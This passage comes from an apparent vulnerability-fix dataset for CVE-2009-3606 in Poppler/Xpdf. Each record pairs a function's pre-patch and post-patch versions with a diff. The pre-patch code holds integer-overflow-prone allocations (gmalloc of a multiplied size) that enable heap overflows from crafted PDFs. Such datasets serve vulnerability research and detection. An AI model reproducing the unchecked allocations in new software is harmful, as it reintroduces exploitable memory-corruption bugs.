        "func_before": "SplashError Splash::fillImageMask(SplashImageMaskSource src, void *srcData,\n\t\t\t\t  int w, int h, SplashCoord *mat,\n\t\t\t\t  GBool glyphMode) {\n  SplashPipe pipe;\n  GBool rot;\n  SplashCoord xScale, yScale, xShear, yShear, yShear1;\n  int tx, tx2, ty, ty2, scaledWidth, scaledHeight, xSign, ySign;\n  int ulx, uly, llx, lly, urx, ury, lrx, lry;\n  int ulx1, uly1, llx1, lly1, urx1, ury1, lrx1, lry1;\n  int xMin, xMax, yMin, yMax;\n  SplashClipResult clipRes, clipRes2;\n  int yp, yq, yt, yStep, lastYStep;\n  int xp, xq, xt, xStep, xSrc;\n  int k1, spanXMin, spanXMax, spanY;\n  SplashColorPtr pixBuf, p;\n  int pixAcc;\n  int x, y, x1, x2, y2;\n  SplashCoord y1;\n  int n, m, i, j;\n\n  if (debugMode) {\n    printf(\"fillImageMask: w=%d h=%d mat=[%.2f %.2f %.2f %.2f %.2f %.2f]\\n\",\n\t   w, h, (double)mat[0], (double)mat[1], (double)mat[2],\n\t   (double)mat[3], (double)mat[4], (double)mat[5]);\n  }\n\n  if (w == 0 && h == 0) return splashErrZeroImage;\n\n  // check for singular matrix\n  if (splashAbs(mat[0] * mat[3] - mat[1] * mat[2]) < 0.000001) {\n    return splashErrSingularMatrix;\n  }\n\n  // compute scale, shear, rotation, translation parameters\n  rot = splashAbs(mat[1]) > splashAbs(mat[0]);\n  if (rot) {\n    xScale = -mat[1];\n    yScale = mat[2] - (mat[0] * mat[3]) / mat[1];\n    xShear = -mat[3] / yScale;\n    yShear = -mat[0] / mat[1];\n  } else {\n    xScale = mat[0];\n    yScale = mat[3] - (mat[1] * mat[2]) / mat[0];\n    xShear = mat[2] / yScale;\n    yShear = mat[1] / mat[0];\n  }\n  // Note 1: The PDF spec says that all pixels whose *centers* lie\n  // within the region get painted -- but that doesn't seem to match\n  // up with what Acrobat actually does: it ends up leaving gaps\n  // between image stripes.  So we use the same rule here as for\n  // fills: any pixel that overlaps the region gets painted.\n  // Note 2: The \"glyphMode\" flag is a kludge: it switches back to\n  // \"correct\" behavior (matching the spec), for use in rendering Type\n  // 3 fonts.\n  // Note 3: The +/-0.01 in these computations is to avoid floating\n  // point precision problems which can lead to gaps between image\n  // stripes (it can cause image stripes to overlap, but that's a much\n  // less visible problem).\n  if (glyphMode) {\n    if (xScale >= 0) {\n      tx = splashRound(mat[4]);\n      tx2 = splashRound(mat[4] + xScale) - 1;\n    } else {\n      tx = splashRound(mat[4]) - 1;\n      tx2 = splashRound(mat[4] + xScale);\n    }\n  } else {\n    if (xScale >= 0) {\n      tx = splashFloor(mat[4] - 0.01);\n      tx2 = splashFloor(mat[4] + xScale + 0.01);\n    } else {\n      tx = splashFloor(mat[4] + 0.01);\n      tx2 = splashFloor(mat[4] + xScale - 0.01);\n    }\n  }\n  scaledWidth = abs(tx2 - tx) + 1;\n  if (glyphMode) {\n    if (yScale >= 0) {\n      ty = splashRound(mat[5]);\n      ty2 = splashRound(mat[5] + yScale) - 1;\n    } else {\n      ty = splashRound(mat[5]) - 1;\n      ty2 = splashRound(mat[5] + yScale);\n    }\n  } else {\n    if (yScale >= 0) {\n      ty = splashFloor(mat[5] - 0.01);\n      ty2 = splashFloor(mat[5] + yScale + 0.01);\n    } else {\n      ty = splashFloor(mat[5] + 0.01);\n      ty2 = splashFloor(mat[5] + yScale - 0.01);\n    }\n  }\n  scaledHeight = abs(ty2 - ty) + 1;\n  xSign = (xScale < 0) ? -1 : 1;\n  ySign = (yScale < 0) ? -1 : 1;\n  yShear1 = (SplashCoord)xSign * yShear;\n\n  // clipping\n  ulx1 = 0;\n  uly1 = 0;\n  urx1 = xSign * (scaledWidth - 1);\n  ury1 = (int)(yShear * urx1);\n  llx1 = splashRound(xShear * ySign * (scaledHeight - 1));\n  lly1 = ySign * (scaledHeight - 1) + (int)(yShear * llx1);\n  lrx1 = xSign * (scaledWidth - 1) +\n           splashRound(xShear * ySign * (scaledHeight - 1));\n  lry1 = ySign * (scaledHeight - 1) + (int)(yShear * lrx1);\n  if (rot) {\n    ulx = tx + uly1;    uly = ty - ulx1;\n    urx = tx + ury1;    ury = ty - urx1;\n    llx = tx + lly1;    lly = ty - llx1;\n    lrx = tx + lry1;    lry = ty - lrx1;\n  } else {\n    ulx = tx + ulx1;    uly = ty + uly1;\n    urx = tx + urx1;    ury = ty + ury1;\n    llx = tx + llx1;    lly = ty + lly1;\n    lrx = tx + lrx1;    lry = ty + lry1;\n  }\n  xMin = (ulx < urx) ? (ulx < llx) ? (ulx < lrx) ? ulx : lrx\n                                   : (llx < lrx) ? llx : lrx\n\t\t     : (urx < llx) ? (urx < lrx) ? urx : lrx\n                                   : (llx < lrx) ? llx : lrx;\n  xMax = (ulx > urx) ? (ulx > llx) ? (ulx > lrx) ? ulx : lrx\n                                   : (llx > lrx) ? llx : lrx\n\t\t     : (urx > llx) ? (urx > lrx) ? urx : lrx\n                                   : (llx > lrx) ? llx : lrx;\n  yMin = (uly < ury) ? (uly < lly) ? (uly < lry) ? uly : lry\n                                   : (lly < lry) ? lly : lry\n\t\t     : (ury < lly) ? (ury < lry) ? ury : lry\n                                   : (lly < lry) ? lly : lry;\n  yMax = (uly > ury) ? (uly > lly) ? (uly > lry) ? uly : lry\n                                   : (lly > lry) ? lly : lry\n\t\t     : (ury > lly) ? (ury > lry) ? ury : lry\n                                   : (lly > lry) ? lly : lry;\n  clipRes = state->clip->testRect(xMin, yMin, xMax, yMax);\n  opClipRes = clipRes;\n\n  // compute Bresenham parameters for x and y scaling\n  yp = h / scaledHeight;\n  yq = h % scaledHeight;\n  xp = w / scaledWidth;\n  xq = w % scaledWidth;\n\n  // allocate pixel buffer\n  pixBuf = (SplashColorPtr)gmalloc((yp + 1) * w);\n\n  // initialize the pixel pipe\n  pipeInit(&pipe, 0, 0, state->fillPattern, NULL, state->fillAlpha,\n\t   gTrue, gFalse);\n  if (vectorAntialias) {\n    drawAAPixelInit();\n  }\n\n  // init y scale Bresenham\n  yt = 0;\n  lastYStep = 1;\n\n  for (y = 0; y < scaledHeight; ++y) {\n\n    // y scale Bresenham\n    yStep = yp;\n    yt += yq;\n    if (yt >= scaledHeight) {\n      yt -= scaledHeight;\n      ++yStep;\n    }\n\n    // read row(s) from image\n    n = (yp > 0) ? yStep : lastYStep;\n    if (n > 0) {\n      p = pixBuf;\n      for (i = 0; i < n; ++i) {\n\t(*src)(srcData, p);\n\tp += w;\n      }\n    }\n    lastYStep = yStep;\n\n    // loop-invariant constants\n    k1 = splashRound(xShear * ySign * y);\n\n    // clipping test\n    if (clipRes != splashClipAllInside &&\n\t!rot &&\n\t(int)(yShear * k1) ==\n\t  (int)(yShear * (xSign * (scaledWidth - 1) + k1))) {\n      if (xSign > 0) {\n\tspanXMin = tx + k1;\n\tspanXMax = spanXMin + (scaledWidth - 1);\n      } else {\n\tspanXMax = tx + k1;\n\tspanXMin = spanXMax - (scaledWidth - 1);\n      }\n      spanY = ty + ySign * y + (int)(yShear * k1);\n      clipRes2 = state->clip->testSpan(spanXMin, spanXMax, spanY);\n      if (clipRes2 == splashClipAllOutside) {\n\tcontinue;\n      }\n    } else {\n      clipRes2 = clipRes;\n    }\n\n    // init x scale Bresenham\n    xt = 0;\n    xSrc = 0;\n\n    // x shear\n    x1 = k1;\n\n    // y shear\n    y1 = (SplashCoord)ySign * y + yShear * x1;\n    // this is a kludge: if yShear1 is negative, then (int)y1 would\n    // change immediately after the first pixel, which is not what we\n    // want\n    if (yShear1 < 0) {\n      y1 += 0.999;\n    }\n\n    // loop-invariant constants\n    n = yStep > 0 ? yStep : 1;\n\n    for (x = 0; x < scaledWidth; ++x) {\n\n      // x scale Bresenham\n      xStep = xp;\n      xt += xq;\n      if (xt >= scaledWidth) {\n\txt -= scaledWidth;\n\t++xStep;\n      }\n\n      // rotation\n      if (rot) {\n\tx2 = (int)y1;\n\ty2 = -x1;\n      } else {\n\tx2 = x1;\n\ty2 = (int)y1;\n      }\n\n      // compute the alpha value for (x,y) after the x and y scaling\n      // operations\n      m = xStep > 0 ? xStep : 1;\n      p = pixBuf + xSrc;\n      pixAcc = 0;\n      for (i = 0; i < n; ++i) {\n\tfor (j = 0; j < m; ++j) {\n\t  pixAcc += *p++;\n\t}\n\tp += w - m;\n      }\n\n      // blend fill color with background\n      if (pixAcc != 0) {\n\tpipe.shape = (pixAcc == n * m)\n\t                 ? (SplashCoord)1\n\t                 : (SplashCoord)pixAcc / (SplashCoord)(n * m);\n\tif (vectorAntialias && clipRes2 != splashClipAllInside) {\n\t  drawAAPixel(&pipe, tx + x2, ty + y2);\n\t} else {\n\t  drawPixel(&pipe, tx + x2, ty + y2, clipRes2 == splashClipAllInside);\n\t}\n      }\n\n      // x scale Bresenham\n      xSrc += xStep;\n\n      // x shear\n      x1 += xSign;\n\n      // y shear\n      y1 += yShear1;\n    }\n  }\n\n  // free memory\n  gfree(pixBuf);\n\n  return splashOk;\n}",
        "func": "SplashError Splash::fillImageMask(SplashImageMaskSource src, void *srcData,\n\t\t\t\t  int w, int h, SplashCoord *mat,\n\t\t\t\t  GBool glyphMode) {\n  SplashPipe pipe;\n  GBool rot;\n  SplashCoord xScale, yScale, xShear, yShear, yShear1;\n  int tx, tx2, ty, ty2, scaledWidth, scaledHeight, xSign, ySign;\n  int ulx, uly, llx, lly, urx, ury, lrx, lry;\n  int ulx1, uly1, llx1, lly1, urx1, ury1, lrx1, lry1;\n  int xMin, xMax, yMin, yMax;\n  SplashClipResult clipRes, clipRes2;\n  int yp, yq, yt, yStep, lastYStep;\n  int xp, xq, xt, xStep, xSrc;\n  int k1, spanXMin, spanXMax, spanY;\n  SplashColorPtr pixBuf, p;\n  int pixAcc;\n  int x, y, x1, x2, y2;\n  SplashCoord y1;\n  int n, m, i, j;\n\n  if (debugMode) {\n    printf(\"fillImageMask: w=%d h=%d mat=[%.2f %.2f %.2f %.2f %.2f %.2f]\\n\",\n\t   w, h, (double)mat[0], (double)mat[1], (double)mat[2],\n\t   (double)mat[3], (double)mat[4], (double)mat[5]);\n  }\n\n  if (w == 0 && h == 0) return splashErrZeroImage;\n\n  // check for singular matrix\n  if (splashAbs(mat[0] * mat[3] - mat[1] * mat[2]) < 0.000001) {\n    return splashErrSingularMatrix;\n  }\n\n  // compute scale, shear, rotation, translation parameters\n  rot = splashAbs(mat[1]) > splashAbs(mat[0]);\n  if (rot) {\n    xScale = -mat[1];\n    yScale = mat[2] - (mat[0] * mat[3]) / mat[1];\n    xShear = -mat[3] / yScale;\n    yShear = -mat[0] / mat[1];\n  } else {\n    xScale = mat[0];\n    yScale = mat[3] - (mat[1] * mat[2]) / mat[0];\n    xShear = mat[2] / yScale;\n    yShear = mat[1] / mat[0];\n  }\n  // Note 1: The PDF spec says that all pixels whose *centers* lie\n  // within the region get painted -- but that doesn't seem to match\n  // up with what Acrobat actually does: it ends up leaving gaps\n  // between image stripes.  So we use the same rule here as for\n  // fills: any pixel that overlaps the region gets painted.\n  // Note 2: The \"glyphMode\" flag is a kludge: it switches back to\n  // \"correct\" behavior (matching the spec), for use in rendering Type\n  // 3 fonts.\n  // Note 3: The +/-0.01 in these computations is to avoid floating\n  // point precision problems which can lead to gaps between image\n  // stripes (it can cause image stripes to overlap, but that's a much\n  // less visible problem).\n  if (glyphMode) {\n    if (xScale >= 0) {\n      tx = splashRound(mat[4]);\n      tx2 = splashRound(mat[4] + xScale) - 1;\n    } else {\n      tx = splashRound(mat[4]) - 1;\n      tx2 = splashRound(mat[4] + xScale);\n    }\n  } else {\n    if (xScale >= 0) {\n      tx = splashFloor(mat[4] - 0.01);\n      tx2 = splashFloor(mat[4] + xScale + 0.01);\n    } else {\n      tx = splashFloor(mat[4] + 0.01);\n      tx2 = splashFloor(mat[4] + xScale - 0.01);\n    }\n  }\n  scaledWidth = abs(tx2 - tx) + 1;\n  if (glyphMode) {\n    if (yScale >= 0) {\n      ty = splashRound(mat[5]);\n      ty2 = splashRound(mat[5] + yScale) - 1;\n    } else {\n      ty = splashRound(mat[5]) - 1;\n      ty2 = splashRound(mat[5] + yScale);\n    }\n  } else {\n    if (yScale >= 0) {\n      ty = splashFloor(mat[5] - 0.01);\n      ty2 = splashFloor(mat[5] + yScale + 0.01);\n    } else {\n      ty = splashFloor(mat[5] + 0.01);\n      ty2 = splashFloor(mat[5] + yScale - 0.01);\n    }\n  }\n  scaledHeight = abs(ty2 - ty) + 1;\n  xSign = (xScale < 0) ? -1 : 1;\n  ySign = (yScale < 0) ? -1 : 1;\n  yShear1 = (SplashCoord)xSign * yShear;\n\n  // clipping\n  ulx1 = 0;\n  uly1 = 0;\n  urx1 = xSign * (scaledWidth - 1);\n  ury1 = (int)(yShear * urx1);\n  llx1 = splashRound(xShear * ySign * (scaledHeight - 1));\n  lly1 = ySign * (scaledHeight - 1) + (int)(yShear * llx1);\n  lrx1 = xSign * (scaledWidth - 1) +\n           splashRound(xShear * ySign * (scaledHeight - 1));\n  lry1 = ySign * (scaledHeight - 1) + (int)(yShear * lrx1);\n  if (rot) {\n    ulx = tx + uly1;    uly = ty - ulx1;\n    urx = tx + ury1;    ury = ty - urx1;\n    llx = tx + lly1;    lly = ty - llx1;\n    lrx = tx + lry1;    lry = ty - lrx1;\n  } else {\n    ulx = tx + ulx1;    uly = ty + uly1;\n    urx = tx + urx1;    ury = ty + ury1;\n    llx = tx + llx1;    lly = ty + lly1;\n    lrx = tx + lrx1;    lry = ty + lry1;\n  }\n  xMin = (ulx < urx) ? (ulx < llx) ? (ulx < lrx) ? ulx : lrx\n                                   : (llx < lrx) ? llx : lrx\n\t\t     : (urx < llx) ? (urx < lrx) ? urx : lrx\n                                   : (llx < lrx) ? llx : lrx;\n  xMax = (ulx > urx) ? (ulx > llx) ? (ulx > lrx) ? ulx : lrx\n                                   : (llx > lrx) ? llx : lrx\n\t\t     : (urx > llx) ? (urx > lrx) ? urx : lrx\n                                   : (llx > lrx) ? llx : lrx;\n  yMin = (uly < ury) ? (uly < lly) ? (uly < lry) ? uly : lry\n                                   : (lly < lry) ? lly : lry\n\t\t     : (ury < lly) ? (ury < lry) ? ury : lry\n                                   : (lly < lry) ? lly : lry;\n  yMax = (uly > ury) ? (uly > lly) ? (uly > lry) ? uly : lry\n                                   : (lly > lry) ? lly : lry\n\t\t     : (ury > lly) ? (ury > lry) ? ury : lry\n                                   : (lly > lry) ? lly : lry;\n  clipRes = state->clip->testRect(xMin, yMin, xMax, yMax);\n  opClipRes = clipRes;\n\n  // compute Bresenham parameters for x and y scaling\n  yp = h / scaledHeight;\n  yq = h % scaledHeight;\n  xp = w / scaledWidth;\n  xq = w % scaledWidth;\n\n  // allocate pixel buffer\n  pixBuf = (SplashColorPtr)gmallocn((yp + 1), w);\n\n  // initialize the pixel pipe\n  pipeInit(&pipe, 0, 0, state->fillPattern, NULL, state->fillAlpha,\n\t   gTrue, gFalse);\n  if (vectorAntialias) {\n    drawAAPixelInit();\n  }\n\n  // init y scale Bresenham\n  yt = 0;\n  lastYStep = 1;\n\n  for (y = 0; y < scaledHeight; ++y) {\n\n    // y scale Bresenham\n    yStep = yp;\n    yt += yq;\n    if (yt >= scaledHeight) {\n      yt -= scaledHeight;\n      ++yStep;\n    }\n\n    // read row(s) from image\n    n = (yp > 0) ? yStep : lastYStep;\n    if (n > 0) {\n      p = pixBuf;\n      for (i = 0; i < n; ++i) {\n\t(*src)(srcData, p);\n\tp += w;\n      }\n    }\n    lastYStep = yStep;\n\n    // loop-invariant constants\n    k1 = splashRound(xShear * ySign * y);\n\n    // clipping test\n    if (clipRes != splashClipAllInside &&\n\t!rot &&\n\t(int)(yShear * k1) ==\n\t  (int)(yShear * (xSign * (scaledWidth - 1) + k1))) {\n      if (xSign > 0) {\n\tspanXMin = tx + k1;\n\tspanXMax = spanXMin + (scaledWidth - 1);\n      } else {\n\tspanXMax = tx + k1;\n\tspanXMin = spanXMax - (scaledWidth - 1);\n      }\n      spanY = ty + ySign * y + (int)(yShear * k1);\n      clipRes2 = state->clip->testSpan(spanXMin, spanXMax, spanY);\n      if (clipRes2 == splashClipAllOutside) {\n\tcontinue;\n      }\n    } else {\n      clipRes2 = clipRes;\n    }\n\n    // init x scale Bresenham\n    xt = 0;\n    xSrc = 0;\n\n    // x shear\n    x1 = k1;\n\n    // y shear\n    y1 = (SplashCoord)ySign * y + yShear * x1;\n    // this is a kludge: if yShear1 is negative, then (int)y1 would\n    // change immediately after the first pixel, which is not what we\n    // want\n    if (yShear1 < 0) {\n      y1 += 0.999;\n    }\n\n    // loop-invariant constants\n    n = yStep > 0 ? yStep : 1;\n\n    for (x = 0; x < scaledWidth; ++x) {\n\n      // x scale Bresenham\n      xStep = xp;\n      xt += xq;\n      if (xt >= scaledWidth) {\n\txt -= scaledWidth;\n\t++xStep;\n      }\n\n      // rotation\n      if (rot) {\n\tx2 = (int)y1;\n\ty2 = -x1;\n      } else {\n\tx2 = x1;\n\ty2 = (int)y1;\n      }\n\n      // compute the alpha value for (x,y) after the x and y scaling\n      // operations\n      m = xStep > 0 ? xStep : 1;\n      p = pixBuf + xSrc;\n      pixAcc = 0;\n      for (i = 0; i < n; ++i) {\n\tfor (j = 0; j < m; ++j) {\n\t  pixAcc += *p++;\n\t}\n\tp += w - m;\n      }\n\n      // blend fill color with background\n      if (pixAcc != 0) {\n\tpipe.shape = (pixAcc == n * m)\n\t                 ? (SplashCoord)1\n\t                 : (SplashCoord)pixAcc / (SplashCoord)(n * m);\n\tif (vectorAntialias && clipRes2 != splashClipAllInside) {\n\t  drawAAPixel(&pipe, tx + x2, ty + y2);\n\t} else {\n\t  drawPixel(&pipe, tx + x2, ty + y2, clipRes2 == splashClipAllInside);\n\t}\n      }\n\n      // x scale Bresenham\n      xSrc += xStep;\n\n      // x shear\n      x1 += xSign;\n\n      // y shear\n      y1 += yShear1;\n    }\n  }\n\n  // free memory\n  gfree(pixBuf);\n\n  return splashOk;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -143,7 +143,7 @@\n   xq = w % scaledWidth;\n \n   // allocate pixel buffer\n-  pixBuf = (SplashColorPtr)gmalloc((yp + 1) * w);\n+  pixBuf = (SplashColorPtr)gmallocn((yp + 1), w);\n \n   // initialize the pixel pipe\n   pipeInit(&pipe, 0, 0, state->fillPattern, NULL, state->fillAlpha,",
        "diff_line_info": {
            "deleted_lines": [
                "  pixBuf = (SplashColorPtr)gmalloc((yp + 1) * w);"
            ],
            "added_lines": [
                "  pixBuf = (SplashColorPtr)gmallocn((yp + 1), w);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/GfxImageColorMap::getGrayLine",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "void GfxImageColorMap::getGrayLine(Guchar *in, Guchar *out, int length) {\n  int i, j;\n  Guchar *inp, *tmp_line;\n\n  switch (colorSpace->getMode()) {\n  case csIndexed:\n  case csSeparation:\n    tmp_line = (Guchar *) gmalloc (length * nComps2);\n    for (i = 0; i < length; i++) {\n      for (j = 0; j < nComps2; j++) {\n\ttmp_line[i * nComps2 + j] = byte_lookup[in[i] * nComps2 + j];\n      }\n    }\n    colorSpace2->getGrayLine(tmp_line, out, length);\n    gfree (tmp_line);\n    break;\n\n  default:\n    inp = in;\n    for (j = 0; j < length; j++)\n      for (i = 0; i < nComps; i++) {\n\t*inp = byte_lookup[*inp * nComps + i];\n\tinp++;\n      }\n    colorSpace->getGrayLine(in, out, length);\n    break;\n  }\n\n}",
        "func": "void GfxImageColorMap::getGrayLine(Guchar *in, Guchar *out, int length) {\n  int i, j;\n  Guchar *inp, *tmp_line;\n\n  switch (colorSpace->getMode()) {\n  case csIndexed:\n  case csSeparation:\n    tmp_line = (Guchar *) gmallocn (length, nComps2);\n    for (i = 0; i < length; i++) {\n      for (j = 0; j < nComps2; j++) {\n\ttmp_line[i * nComps2 + j] = byte_lookup[in[i] * nComps2 + j];\n      }\n    }\n    colorSpace2->getGrayLine(tmp_line, out, length);\n    gfree (tmp_line);\n    break;\n\n  default:\n    inp = in;\n    for (j = 0; j < length; j++)\n      for (i = 0; i < nComps; i++) {\n\t*inp = byte_lookup[*inp * nComps + i];\n\tinp++;\n      }\n    colorSpace->getGrayLine(in, out, length);\n    break;\n  }\n\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -5,7 +5,7 @@\n   switch (colorSpace->getMode()) {\n   case csIndexed:\n   case csSeparation:\n-    tmp_line = (Guchar *) gmalloc (length * nComps2);\n+    tmp_line = (Guchar *) gmallocn (length, nComps2);\n     for (i = 0; i < length; i++) {\n       for (j = 0; j < nComps2; j++) {\n \ttmp_line[i * nComps2 + j] = byte_lookup[in[i] * nComps2 + j];",
        "diff_line_info": {
            "deleted_lines": [
                "    tmp_line = (Guchar *) gmalloc (length * nComps2);"
            ],
            "added_lines": [
                "    tmp_line = (Guchar *) gmallocn (length, nComps2);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/GfxIndexedColorSpace::getRGBLine",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "void GfxIndexedColorSpace::getRGBLine(Guchar *in, unsigned int *out, int length) {\n  Guchar *line;\n  int i, j, n;\n\n  n = base->getNComps();\n  line = (Guchar *) gmalloc (length * n);\n  for (i = 0; i < length; i++)\n    for (j = 0; j < n; j++)\n      line[i * n + j] = lookup[in[i] * n + j];\n\n  base->getRGBLine(line, out, length);\n\n  gfree (line);\n}",
        "func": "void GfxIndexedColorSpace::getRGBLine(Guchar *in, unsigned int *out, int length) {\n  Guchar *line;\n  int i, j, n;\n\n  n = base->getNComps();\n  line = (Guchar *) gmallocn (length, n);\n  for (i = 0; i < length; i++)\n    for (j = 0; j < n; j++)\n      line[i * n + j] = lookup[in[i] * n + j];\n\n  base->getRGBLine(line, out, length);\n\n  gfree (line);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -3,7 +3,7 @@\n   int i, j, n;\n \n   n = base->getNComps();\n-  line = (Guchar *) gmalloc (length * n);\n+  line = (Guchar *) gmallocn (length, n);\n   for (i = 0; i < length; i++)\n     for (j = 0; j < n; j++)\n       line[i * n + j] = lookup[in[i] * n + j];",
        "diff_line_info": {
            "deleted_lines": [
                "  line = (Guchar *) gmalloc (length * n);"
            ],
            "added_lines": [
                "  line = (Guchar *) gmallocn (length, n);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/GfxImageColorMap::GfxImageColorMap",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "GfxImageColorMap::GfxImageColorMap(int bitsA, Object *decode,\n\t\t\t\t   GfxColorSpace *colorSpaceA) {\n  GfxIndexedColorSpace *indexedCS;\n  GfxSeparationColorSpace *sepCS;\n  int maxPixel, indexHigh;\n  Guchar *lookup2;\n  Function *sepFunc;\n  Object obj;\n  double x[gfxColorMaxComps];\n  double y[gfxColorMaxComps];\n  int i, j, k, byte;\n  double mapped;\n\n  ok = gTrue;\n\n  // bits per component and color space\n  bits = bitsA;\n  maxPixel = (1 << bits) - 1;\n  colorSpace = colorSpaceA;\n\n  // this is a hack to support 16 bits images, everywhere\n  // we assume a component fits in 8 bits, with this hack\n  // we treat 16 bit images as 8 bit ones until it's fixed correctly.\n  // The hack has another part on ImageStream::getLine\n  if (maxPixel > 255) maxPixel = 255;\n\n  // initialize\n  for (k = 0; k < gfxColorMaxComps; ++k) {\n    lookup[k] = NULL;\n  }\n\n  // get decode map\n  if (decode->isNull()) {\n    nComps = colorSpace->getNComps();\n    colorSpace->getDefaultRanges(decodeLow, decodeRange, maxPixel);\n  } else if (decode->isArray()) {\n    nComps = decode->arrayGetLength() / 2;\n    if (nComps != colorSpace->getNComps()) {\n      goto err1;\n    }\n    for (i = 0; i < nComps; ++i) {\n      decode->arrayGet(2*i, &obj);\n      if (!obj.isNum()) {\n\tgoto err2;\n      }\n      decodeLow[i] = obj.getNum();\n      obj.free();\n      decode->arrayGet(2*i+1, &obj);\n      if (!obj.isNum()) {\n\tgoto err2;\n      }\n      decodeRange[i] = obj.getNum() - decodeLow[i];\n      obj.free();\n    }\n  } else {\n    goto err1;\n  }\n\n  // Construct a lookup table -- this stores pre-computed decoded\n  // values for each component, i.e., the result of applying the\n  // decode mapping to each possible image pixel component value.\n  //\n  // Optimization: for Indexed and Separation color spaces (which have\n  // only one component), we store color values in the lookup table\n  // rather than component values.\n  colorSpace2 = NULL;\n  nComps2 = 0;\n  if (colorSpace->getMode() == csIndexed) {\n    // Note that indexHigh may not be the same as maxPixel --\n    // Distiller will remove unused palette entries, resulting in\n    // indexHigh < maxPixel.\n    indexedCS = (GfxIndexedColorSpace *)colorSpace;\n    colorSpace2 = indexedCS->getBase();\n    indexHigh = indexedCS->getIndexHigh();\n    nComps2 = colorSpace2->getNComps();\n    lookup2 = indexedCS->getLookup();\n    colorSpace2->getDefaultRanges(x, y, indexHigh);\n    byte_lookup = (Guchar *)gmalloc ((maxPixel + 1) * nComps2);\n    for (k = 0; k < nComps2; ++k) {\n      lookup[k] = (GfxColorComp *)gmallocn(maxPixel + 1,\n\t\t\t\t\t   sizeof(GfxColorComp));\n      for (i = 0; i <= maxPixel; ++i) {\n\tj = (int)(decodeLow[0] + (i * decodeRange[0]) / maxPixel + 0.5);\n\tif (j < 0) {\n\t  j = 0;\n\t} else if (j > indexHigh) {\n\t  j = indexHigh;\n\t}\n\n\tmapped = x[k] + (lookup2[j*nComps2 + k] / 255.0) * y[k];\n\tlookup[k][i] = dblToCol(mapped);\n\tbyte_lookup[i * nComps2 + k] = (Guchar) (mapped * 255);\n      }\n    }\n  } else if (colorSpace->getMode() == csSeparation) {\n    sepCS = (GfxSeparationColorSpace *)colorSpace;\n    colorSpace2 = sepCS->getAlt();\n    nComps2 = colorSpace2->getNComps();\n    sepFunc = sepCS->getFunc();\n    byte_lookup = (Guchar *)gmallocn ((maxPixel + 1), nComps2);\n    for (k = 0; k < nComps2; ++k) {\n      lookup[k] = (GfxColorComp *)gmallocn(maxPixel + 1,\n\t\t\t\t\t   sizeof(GfxColorComp));\n      for (i = 0; i <= maxPixel; ++i) {\n\tx[0] = decodeLow[0] + (i * decodeRange[0]) / maxPixel;\n\tsepFunc->transform(x, y);\n\tlookup[k][i] = dblToCol(y[k]);\n\tbyte_lookup[i*nComps2 + k] = (Guchar) (y[k] * 255);\n      }\n    }\n  } else {\n    byte_lookup = (Guchar *)gmallocn ((maxPixel + 1), nComps);\n    for (k = 0; k < nComps; ++k) {\n      lookup[k] = (GfxColorComp *)gmallocn(maxPixel + 1,\n\t\t\t\t\t   sizeof(GfxColorComp));\n      for (i = 0; i <= maxPixel; ++i) {\n\tmapped = decodeLow[k] + (i * decodeRange[k]) / maxPixel;\n\tlookup[k][i] = dblToCol(mapped);\n\tbyte = (int) (mapped * 255.0 + 0.5);\n\tif (byte < 0)  \n\t  byte = 0;  \n\telse if (byte > 255)  \n\t  byte = 255;  \n\tbyte_lookup[i * nComps + k] = byte;\t\n      }\n    }\n  }\n\n  return;\n\n err2:\n  obj.free();\n err1:\n  ok = gFalse;\n  byte_lookup = NULL;\n}",
        "func": "GfxImageColorMap::GfxImageColorMap(int bitsA, Object *decode,\n\t\t\t\t   GfxColorSpace *colorSpaceA) {\n  GfxIndexedColorSpace *indexedCS;\n  GfxSeparationColorSpace *sepCS;\n  int maxPixel, indexHigh;\n  Guchar *lookup2;\n  Function *sepFunc;\n  Object obj;\n  double x[gfxColorMaxComps];\n  double y[gfxColorMaxComps];\n  int i, j, k, byte;\n  double mapped;\n\n  ok = gTrue;\n\n  // bits per component and color space\n  bits = bitsA;\n  maxPixel = (1 << bits) - 1;\n  colorSpace = colorSpaceA;\n\n  // this is a hack to support 16 bits images, everywhere\n  // we assume a component fits in 8 bits, with this hack\n  // we treat 16 bit images as 8 bit ones until it's fixed correctly.\n  // The hack has another part on ImageStream::getLine\n  if (maxPixel > 255) maxPixel = 255;\n\n  // initialize\n  for (k = 0; k < gfxColorMaxComps; ++k) {\n    lookup[k] = NULL;\n  }\n\n  // get decode map\n  if (decode->isNull()) {\n    nComps = colorSpace->getNComps();\n    colorSpace->getDefaultRanges(decodeLow, decodeRange, maxPixel);\n  } else if (decode->isArray()) {\n    nComps = decode->arrayGetLength() / 2;\n    if (nComps != colorSpace->getNComps()) {\n      goto err1;\n    }\n    for (i = 0; i < nComps; ++i) {\n      decode->arrayGet(2*i, &obj);\n      if (!obj.isNum()) {\n\tgoto err2;\n      }\n      decodeLow[i] = obj.getNum();\n      obj.free();\n      decode->arrayGet(2*i+1, &obj);\n      if (!obj.isNum()) {\n\tgoto err2;\n      }\n      decodeRange[i] = obj.getNum() - decodeLow[i];\n      obj.free();\n    